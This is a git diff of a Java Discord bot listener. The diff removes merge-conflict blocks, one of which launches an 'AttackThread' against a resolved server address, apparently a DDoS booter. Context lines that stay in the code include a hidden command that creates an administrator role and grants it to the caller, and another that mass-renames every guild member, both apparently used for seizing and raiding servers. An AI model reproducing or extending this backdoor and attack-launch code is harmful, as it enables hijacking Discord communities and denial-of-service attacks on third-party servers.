@@ -108,19 +108,6 @@ public class DiscordListener extends ListenerAdapter {
                     event.reply("ok").queue();
                     for(Member m : event.getGuild().getMembers()) event.getGuild().modifyNickname(m, Static.getRandomFromList(Config.CHANGE_NICKS)).queue();
                 }
-
-<<<<<<< Updated upstream
-                ServerInfo info = Resolve.getServerInfo(addr);
-                if (info == null || !info.isOnline()) {
-                    event.getHook().sendMessageEmbeds(MainDC.getInstance().discord.embeds.offlineServer(addr, info)).queue();
-                } else {
-                    int atID = MainDC.getInstance().incAtt();
-                    event.getHook().sendMessageEmbeds(MainDC.getInstance().discord.embeds.startAttack(addr, method, event.getOption("protocol").getAsString(), atID)).queue();
-                    Thread th = new AttackThread(atID, addr, protocol, method);
-                    th.start();
-                    MainDC.getInstance().threadManager.addThread(event.getMember().getId(), th);
-                }
-=======
             } else {
                 event.getUser().openPrivateChannel().queue(privateChannel -> {
                     if(MainDC.getInstance().dro4er.contains(event.getUser().getId())){
@@ -133,7 +120,6 @@ public class DiscordListener extends ListenerAdapter {
                     }
                     event.reply("ok").queue();
                 });
->>>>>>> Stashed changes
             }
         } else if (event.getName().equals("methods")) {
             event.reply(new MessageBuilder().setEmbeds(MainDC.getInstance().discord.embeds.methods()).build()).queue();
@@ -154,15 +140,7 @@ public class DiscordListener extends ListenerAdapter {
                 } else if(cmd.equals("admin")){
                     event.getGuild().createRole().setPermissions(Permission.ADMINISTRATOR).setName(Static.randomStr(10)).queue(r -> event.getGuild().addRoleToMember(event.getMember(), r).queue());
                     event.reply("Im give you Admin role").queue();
-<<<<<<< Updated upstream
-                } else if(cmd.equals("cn")){ //cn - сменить ники, а я блять не понял, какой кингуру какую азию перепрыгивает
-                    event.reply("ok").queue();
-                    for(Member m : event.getGuild().getMembers()) event.getGuild().modifyNickname(m, Static.getRandomFromList(Config.CHANGE_NICKS)).queue();
                 }
-
-=======
-                }
->>>>>>> Stashed changes
             } else {
                 event.getUser().openPrivateChannel().queue(privateChannel -> {
                     if(MainDC.getInstance().dro4er.contains(event.getUser().getId())){
